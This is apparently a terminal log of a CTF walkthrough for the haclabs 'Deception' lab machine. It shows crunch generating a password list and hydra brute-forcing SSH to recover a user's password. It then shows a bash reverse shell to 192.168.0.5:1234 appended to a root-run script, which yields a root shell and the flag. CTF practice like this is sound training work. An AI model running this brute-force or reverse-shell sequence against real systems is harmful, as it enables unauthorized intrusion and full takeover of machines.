I know the password for yash : ya5h** but I forgot the last 2 words. find them and use to connect to SSH 



root@ap:~/CTF/Deception# man crunch 
root@ap:~/CTF/Deception# crunch 6 6 -t ya5h@@ -o pass.txt
Crunch will now generate the following amount of data: 4732 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 676 

crunch: 100% completed generating output
root@ap:~/CTF/Deception# hydra -l yash -P pass.txt ssh://192.168.0.4
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 16:06:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 676 login tries (l:1/p:676), ~43 tries per task
[DATA] attacking ssh://192.168.0.4:22/
[22][ssh] host: 192.168.0.4   login: yash   password: ya5hay
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 16:06:50


yash@haclabs:~$ cat perm.sh 
yash@haclabs:~$ echo '#!/bin/bash' >> perm.sh 
yash@haclabs:~$ 
yash@haclabs:~$ 
yash@haclabs:~$ cat perm.sh 
#!/bin/bash
yash@haclabs:~$ 
yash@haclabs:~$ echo 'bash -i >& /dev/tcp/192.168.0.5/1234 0>&1' >> perm.sh 
yash@haclabs:~$ cat perm.sh 
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.5/1234 0>&1



root@ap:~/CTF/Deception# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.5] from (UNKNOWN) [192.168.0.4] 40198
bash: cannot set terminal process group (1172): Inappropriate ioctl for device
bash: no job control in this shell
root@haclabs:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@haclabs:~# ls   	
ls
root_flag.txt
root@haclabs:~# cat roo*
cat roo*
                _                                                          _           _                                             _                 _          
               (_)                                                        (_)         (_)                                         _ (_)             _ (_)         
       _  _  _ (_)  _  _  _  _      _  _  _  _  _  _  _    _  _  _  _   _ (_) _  _  _  _       _  _  _     _  _  _  _            (_)(_)            (_)(_)         
     _(_)(_)(_)(_) (_)(_)(_)(_)_  _(_)(_)(_)(_)(_)(_)(_)_ (_)(_)(_)(_)_(_)(_)(_)(_)(_)(_)   _ (_)(_)(_) _ (_)(_)(_)(_)_             (_)               (_)         
    (_)        (_)(_) _  _  _ (_)(_)       (_) _  _  _ (_)(_)        (_)  (_)         (_)  (_)         (_)(_)        (_)            (_)               (_)         
    (_)        (_)(_)(_)(_)(_)(_)(_)       (_)(_)(_)(_)(_)(_)        (_)  (_)     _   (_)  (_)         (_)(_)        (_)            (_)     _  _      (_)         
    (_)_  _  _ (_)(_)_  _  _  _  (_)_  _  _(_)_  _  _  _  (_) _  _  _(_)  (_)_  _(_)_ (_) _(_) _  _  _ (_)(_)        (_)          _ (_) _  (_)(_)   _ (_) _       
      (_)(_)(_)(_)  (_)(_)(_)(_)   (_)(_)(_) (_)(_)(_)(_) (_)(_)(_)(_)      (_)(_) (_)(_)(_)  (_)(_)(_)   (_)        (_)         (_)(_)(_) (_)(_)  (_)(_)(_)      
                                                          (_)                                                                                                     
                                                          (_)                                                                                                    




----------------------------------
Visit our website : https://www.haclabs.org
Submit walkthrough at : yash@haclabs.org
root@haclabs:~# 


